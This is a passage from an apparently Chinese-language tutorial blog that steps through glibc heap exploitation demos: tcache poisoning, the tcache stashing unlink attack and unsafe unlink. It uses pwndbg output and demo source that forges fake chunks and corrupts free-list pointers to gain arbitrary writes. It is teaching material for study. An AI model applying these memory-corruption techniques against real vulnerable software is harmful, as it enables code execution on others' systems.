class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x90</span> [  <span class="number">2</span>]: <span class="number">0x55ce97ce6330</span> —▸ <span class="number">0x7fff96c64628</span> —▸ <span class="number">0x55ce96f65410</span> (__libc_csu_init) ◂— ...</span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>我们就发现 变成了 b —&gt; &amp;stack_var ,然后我们只需 malloc 两次就能将栈地址拿到</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">─────────────────────────────────────────────────[ SOURCE (CODE) ]──────────────────────────────────────────────────</span><br><span class="line">In file: /pwn/tcache_poisoning.c</span><br><span class="line">   <span class="number">36</span></span><br><span class="line">   <span class="number">37</span> <span class="built_in">printf</span>(<span class="string">&quot;1st malloc(128): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">128</span>));</span><br><span class="line">   <span class="number">38</span> <span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p ].\n&quot;</span>, &amp;stack_var);</span><br><span class="line">   <span class="number">39</span></span><br><span class="line">   <span class="number">40</span> <span class="keyword">intptr_t</span> *c = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line"> ► <span class="number">41</span> <span class="built_in">printf</span>(<span class="string">&quot;2nd malloc(128): %p\n&quot;</span>, c);</span><br><span class="line">   <span class="number">42</span> <span class="built_in">printf</span>(<span class="string">&quot;We got the control\n&quot;</span>);</span><br><span class="line">   <span class="number">43</span></span><br><span class="line">   <span class="number">44</span> assert((<span class="keyword">long</span>)&amp;stack_var == (<span class="keyword">long</span>)c);</span><br><span class="line">   <span class="number">45</span> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">   <span class="number">46</span> &#125;</span><br><span class="line">─────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp     <span class="number">0x7fff96c64620</span> —▸ <span class="number">0x7f5ea82fbfc8</span> (__exit_funcs_lock) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│ rax r8  <span class="number">0x7fff96c64628</span> —▸ <span class="number">0x55ce96f65410</span> (__libc_csu_init) ◂— endbr64</span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│         <span class="number">0x7fff96c64630</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│         <span class="number">0x7fff96c64638</span> —▸ <span class="number">0x55ce97ce6330</span> —▸ <span class="number">0x7fff96c64628</span> —▸ <span class="number">0x55ce96f65410</span> (__libc_csu_init) ◂— endbr64</span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│         <span class="number">0x7fff96c64640</span> —▸ <span class="number">0x7fff96c64628</span> —▸ <span class="number">0x55ce96f65410</span> (__libc_csu_init) ◂— endbr64</span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│         <span class="number">0x7fff96c64648</span> ◂— <span class="number">0x6690dce44b0a5500</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│ rbp     <span class="number">0x7fff96c64650</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│         <span class="number">0x7fff96c64658</span> —▸ <span class="number">0x7f5ea81320b3</span> (__libc_start_main+<span class="number">243</span>) ◂— mov    edi, eax</span><br><span class="line">───────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────</span><br><span class="line"> ► f <span class="number">0</span>     <span class="number">55</span>ce96f653a3 main+<span class="number">410</span></span><br><span class="line">   f <span class="number">1</span>     <span class="number">7f</span>5ea81320b3 __libc_start_main+<span class="number">243</span></span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; p c</span><br><span class="line">$<span class="number">6</span> = (<span class="keyword">intptr_t</span> *) <span class="number">0x7fff96c64628</span></span><br></pre></td></tr></table></figure><h3 id="10-tcache-stashing-unlink-attack"><a href="#10-tcache-stashing-unlink-attack" class="headerlink" title="10. tcache_stashing_unlink_attack"></a>10. tcache_stashing_unlink_attack</h3><p>tcache 上的 stashing unlink attack</p><p>当你能够覆盖victor-&gt;bk指针时，可以使用这个技术。此外，至少需要用calloc分配一个chunk。</p><p>在glibc中，将smallbin放入tcache的机制给了我们发动攻击的机会. 这种技术允许我们把libc addr写到任何我们想要的地方，并在任何需要的地方创建一个假的chunk。在这种情况下，我们将在堆栈上创建一个假的chunk.</p><p>例如此时我们在栈上伪造一个 chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">   <span class="number">22</span>     stack_var[<span class="number">3</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;stack_var[<span class="number">2</span>]);</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; x/<span class="number">20</span>gx stack_var</span><br><span class="line"><span class="number">0x7fffea4571c0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffea4571d0</span>:<span class="number">0x0000000000000000</span><span class="number">0x00007fffea4571d0</span></span><br><span class="line"><span class="number">0x7fffea4571e0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffea4571f0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffea457200</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffea457210</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffea457220</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffea457230</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffea457240</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffea457250</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure><p>首先让我们向 fake_chunk-&gt;bk 写一个可写的地址，以绕过 glibc 中的 bck-&gt;fd = bin。这里我们选择stack_var[2]的地址作为fake bk。之后我们可以看到*(fake_chunk-&gt;bk + 0x10)，也就是stack_var[4]在攻击后将成为libc addr</p><p>malloc 9 个chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">29</span>     <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line"><span class="number">30</span>         chunk_lis[i] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>*)<span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"><span class="number">31</span>     &#125;</span><br></pre></td></tr></table></figure><p>free 7 个chunk，填满 tcache</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">36</span>     <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">3</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">  <span class="number">37</span>         <span class="built_in">free</span>(chunk_lis[i]);</span><br><span class="line">  <span class="number">38</span>     &#125;</span><br><span class="line">  <span class="number">39</span></span><br><span class="line">► <span class="number">40</span>     <span class="built_in">printf</span>(<span class="string">&quot;As you can see, chunk1 &amp; [chunk3,chunk8] are put into tcache bins while chunk0 and chunk2 will be put into unsorted bin.\n\n&quot;</span>);</span><br><span class="line">  <span class="number">41</span></span><br><span class="line">  <span class="number">42</span>     <span class="comment">//last tcache bin</span></span><br><span class="line">  <span class="number">43</span>     <span class="built_in">free</span>(chunk_lis[<span class="number">1</span>]);</span><br></pre></td></tr></table></figure><p>这个我们注意一下， tcache bin 的最后一个bin是  chunk_lis[1]</p><p>然后在 unsort bin 里放入两个 chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">   <span class="number">44</span>     <span class="comment">//now they are put into unsorted bin</span></span><br><span class="line"> ► <span class="number">45</span>     <span class="built_in">free</span>(chunk_lis[<span class="number">0</span>]);</span><br><span class="line">   <span class="number">46</span>     <span class="built_in">free</span>(chunk_lis[<span class="number">2</span>]);</span><br><span class="line">   <span class="number">47</span></span><br><span class="line">     ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0xa0</span> [  <span class="number">7</span>]: <span class="number">0x55a4674bc340</span> —▸ <span class="number">0x55a4674bc7a0</span> —▸ <span class="number">0x55a4674bc700</span> —▸ <span class="number">0x55a4674bc660</span> —▸ <span class="number">0x55a4674bc5c0</span> —▸ <span class="number">0x55a4674bc520</span> —▸ <span class="number">0x55a4674bc480</span> ◂— <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x55a4674bc3d0</span> —▸ <span class="number">0x55a4674bc290</span> —▸ <span class="number">0x7fd3f030cbe0</span> (main_arena+<span class="number">96</span>) ◂— <span class="number">0x55a4674bc3d0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>然后分配一个大于 0x90 的chunk ，这个时候 chunk0 和 chunk2 会被放入 smallbin 里</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">49</span>     <span class="built_in">printf</span>(<span class="string">&quot;Now we alloc a chunk larger than 0x90 to put chunk0 and chunk2 into small bin.\n\n&quot;</span>);</span><br><span class="line">  <span class="number">50</span></span><br><span class="line">  <span class="number">51</span>     <span class="built_in">malloc</span>(<span class="number">0xa0</span>);<span class="comment">// size &gt; 0x90</span></span><br></pre></td></tr></table></figure><p>然后，我再 malloc 两个 chunk ，从tcache bin 取出两个 chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0xa0</span> [  <span class="number">5</span>]: <span class="number">0x55a4674bc700</span> —▸ <span class="number">0x55a4674bc660</span> —▸ <span class="number">0x55a4674bc5c0</span> —▸ <span class="number">0x55a4674bc520</span> —▸ <span class="number">0x55a4674bc480</span> ◂— <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line"><span class="number">0xa0</span>: <span class="number">0x55a4674bc3d0</span> —▸ <span class="number">0x55a4674bc290</span> —▸ <span class="number">0x7fd3f030cc70</span> (main_arena+<span class="number">240</span>) ◂— <span class="number">0x55a4674bc3d0</span></span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>然后此时，我们假设有一个漏洞能修改 chunklis[2]的 bck</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">61</span>     <span class="comment">//change victim-&gt;bck</span></span><br><span class="line">  <span class="number">62</span>     <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">► <span class="number">63</span>     chunk_lis[<span class="number">2</span>][<span class="number">1</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)stack_var;</span><br><span class="line">  <span class="number">64</span>     <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">  <span class="number">65</span></span><br></pre></td></tr></table></figure><p>此时 bins 如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0xa0</span> [  <span class="number">5</span>]: <span class="number">0x55a4674bc700</span> —▸ <span class="number">0x55a4674bc660</span> —▸ <span class="number">0x55a4674bc5c0</span> —▸ <span class="number">0x55a4674bc520</span> —▸ <span class="number">0x55a4674bc480</span> ◂— <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line"><span class="number">0xa0</span> [corrupted]</span><br><span class="line">FD: <span class="number">0x55a4674bc3d0</span> —▸ <span class="number">0x55a4674bc290</span> —▸ <span class="number">0x7fd3f030cc70</span> (main_arena+<span class="number">240</span>) ◂— <span class="number">0x55a4674bc3d0</span></span><br><span class="line">BK: <span class="number">0x55a4674bc290</span> —▸ <span class="number">0x55a4674bc3d0</span> —▸ <span class="number">0x7fffea4571c0</span> —▸ <span class="number">0x7fffea4571d0</span> ◂— <span class="number">0x0</span></span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>然后我们 calloc 一个新 chunk ，此时将 chunk[0] (calloc 不会从 tcache 取)</p><p>smallbin 的chunk 会被重新填充到 tache bin里，然后我们可以通过 tcache 没有严格的检查，再将 fake chunk 取出</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0xa0</span> [  <span class="number">7</span>]: <span class="number">0x7fffea4571d0</span> —▸ <span class="number">0x55a4674bc3e0</span> —▸ <span class="number">0x55a4674bc700</span> —▸ <span class="number">0x55a4674bc660</span> —▸ <span class="number">0x55a4674bc5c0</span> —▸ <span class="number">0x55a4674bc520</span> —▸ <span class="number">0x55a4674bc480</span> ◂— <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line"><span class="number">0xa0</span> [corrupted]</span><br><span class="line">FD: <span class="number">0x55a4674bc3d0</span> —▸ <span class="number">0x55a4674bc700</span> ◂— <span class="number">0x0</span></span><br><span class="line">BK: <span class="number">0x7fffea4571d0</span> ◂— <span class="number">0x0</span></span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">In file: /pwn/tcache_stashing_unlink_attack.c</span><br><span class="line">   <span class="number">71</span>     <span class="built_in">printf</span>(<span class="string">&quot;Now our fake chunk has been put into tcache bin[0xa0] list. Its fd pointer now point to next free chunk: %p and the bck-&gt;fd has been changed into a libc addr: %p\n\n&quot;</span>,(<span class="keyword">void</span>*)stack_var[<span class="number">2</span>],(<span class="keyword">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line">   <span class="number">72</span></span><br><span class="line">   <span class="number">73</span>     <span class="comment">//malloc and return our fake chunk on stack</span></span><br><span class="line">   <span class="number">74</span>     target = <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">   <span class="number">75</span></span><br><span class="line"> ► <span class="number">76</span>     <span class="built_in">printf</span>(<span class="string">&quot;As you can see, next malloc(0x90) will return the region our fake chunk: %p\n&quot;</span>,(<span class="keyword">void</span>*)target);</span><br><span class="line">   <span class="number">77</span></span><br><span class="line">   <span class="number">78</span>     assert(target == &amp;stack_var[<span class="number">2</span>]);</span><br><span class="line">   <span class="number">79</span>     <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">   <span class="number">80</span> &#125;</span><br><span class="line">─────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp     <span class="number">0x7fffea4571b0</span> ◂— <span class="number">0x900000009</span> <span class="comment">/* &#x27;\t&#x27; */</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│         <span class="number">0x7fffea4571b8</span> —▸ <span class="number">0x7fffea4571d0</span> —▸ <span class="number">0x55a4674bc3e0</span> —▸ <span class="number">0x55a4674bc700</span> —▸ <span class="number">0x55a4674bc660</span> ◂— ...</span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│         <span class="number">0x7fffea4571c0</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓</span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│ rax r8  <span class="number">0x7fffea4571d0</span> —▸ <span class="number">0x55a4674bc3e0</span> —▸ <span class="number">0x55a4674bc700</span> —▸ <span class="number">0x55a4674bc660</span> —▸ <span class="number">0x55a4674bc5c0</span> ◂— ...</span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│         <span class="number">0x7fffea4571d8</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│         <span class="number">0x7fffea4571e0</span> —▸ <span class="number">0x7fd3f030cc70</span> (main_arena+<span class="number">240</span>) —▸ <span class="number">0x7fd3f030cc60</span> (main_arena+<span class="number">224</span>) —▸ <span class="number">0x7fd3f030cc50</span> (main_arena+<span class="number">208</span>) —▸ <span class="number">0x7fd3f030cc40</span> (main_arena+<span class="number">192</span>) ◂— ...</span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│         <span class="number">0x7fffea4571e8</span> ◂— <span class="number">0x0</span></span><br><span class="line">───────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────</span><br><span class="line"> ► f <span class="number">0</span>     <span class="number">55</span>a466c59494 main+<span class="number">619</span></span><br><span class="line">   f <span class="number">1</span>     <span class="number">7f</span>d3f01480b3 __libc_start_main+<span class="number">243</span></span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; p target</span><br><span class="line">$<span class="number">15</span> = (<span class="keyword">unsigned</span> <span class="keyword">long</span> *) <span class="number">0x7fffea4571d0</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><h3 id="11-unsafe-unlink"><a href="#11-unsafe-unlink" class="headerlink" title="11. unsafe_unlink"></a>11. unsafe_unlink</h3><p>分配两个足够大的 chunk ，free 后不会被放入 fastbin 和tcache （0x420)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">15</span> <span class="built_in">printf</span>(<span class="string">&quot;The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.\n&quot;</span>);</span><br><span class="line">  <span class="number">16</span></span><br><span class="line">  <span class="number">17</span> <span class="keyword">int</span> malloc_size = <span class="number">0x420</span>; <span class="comment">//we want to be big enough not to use tcache or fastbin</span></span><br><span class="line">  <span class="number">18</span> <span class="keyword">int</span> header_size = <span class="number">2</span>;</span><br><span class="line">  <span class="number">19</span></span><br><span class="line">► <span class="number">20</span> <span class="built_in">printf</span>(<span class="string">&quot;The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.\n\n&quot;</span>);</span><br><span class="line">  <span class="number">21</span></span><br><span class="line">  <span class="number">22</span> chunk0_ptr = (<span class="keyword">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk0</span></span><br><span class="line">  <span class="number">23</span> <span class="keyword">uint64_t</span> *chunk1_ptr  = (<span class="keyword">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk1</span></span><br></pre></td></tr></table></figure><p>然后我们需要在堆上伪造一个 chunk （ 我们设置我们的假块大小，这样就可以绕过<a href="https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=d6db68e66dff25d12c3bc5641b60cbd7fb6ab44f%E4%B8%AD%E4%BB%8B%E7%BB%8D%E7%9A%84%E6%A3%80%E6%9F%A5%E3%80%82">https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=d6db68e66dff25d12c3bc5641b60cbd7fb6ab44f中介绍的检查。</a>)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">29</span> chunk0_ptr[<span class="number">1</span>] = chunk0_ptr[<span class="number">-1</span>] - <span class="number">0x10</span>;</span><br><span class="line">  <span class="number">30</span> <span class="built_in">printf</span>(<span class="string">&quot;We setup the &#x27;next_free_chunk&#x27; (fd) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;fd-&gt;bk = P.\n&quot;</span>);</span><br><span class="line">► <span class="number">31</span> chunk0_ptr[<span class="number">2</span>] = (<span class="keyword">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>)*<span class="number">3</span>);</span><br><span class="line">  <span class="number">32</span> <span class="built_in">printf</span>(<span class="string">&quot;We setup the &#x27;previous_free_chunk&#x27; (bk) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;bk-&gt;fd = P.\n&quot;</span>);</span><br><span class="line">  <span class="number">33</span> <span class="built_in">printf</span>(<span class="string">&quot;With this setup we can pass this check: (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False\n&quot;</span>);</span><br><span class="line">  <span class="number">34</span> chunk0_ptr[<span class="number">3</span>] = (<span class="keyword">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>)*<span class="number">2</span>);</span><br></pre></td></tr></table></figure><p>我们设置好 size ， fd ，bk 以</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">30</span>gx <span class="number">0x56540553d2a0</span><span class="number">-0x20</span></span><br><span class="line"><span class="number">0x56540553d280</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x56540553d290</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000431</span>         -&gt; chunk0_ptr</span><br><span class="line"><span class="number">0x56540553d2a0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000421</span>         -&gt; fake chunk</span><br><span class="line"><span class="number">0x56540553d2b0</span>:<span class="number">0x0000565403b5b008</span><span class="number">0x0000565403b5b010</span></span><br><span class="line"><span class="number">0x56540553d2c0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x56540553d2d0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure><p>我们假设我们在chunk0中有一个溢出，这样我们就可以自由地改变chunk1的数据</p><p>例如改 chunk1 的preve size  和 size</p><p>bypass check</p><p><code>(P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P)== False</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 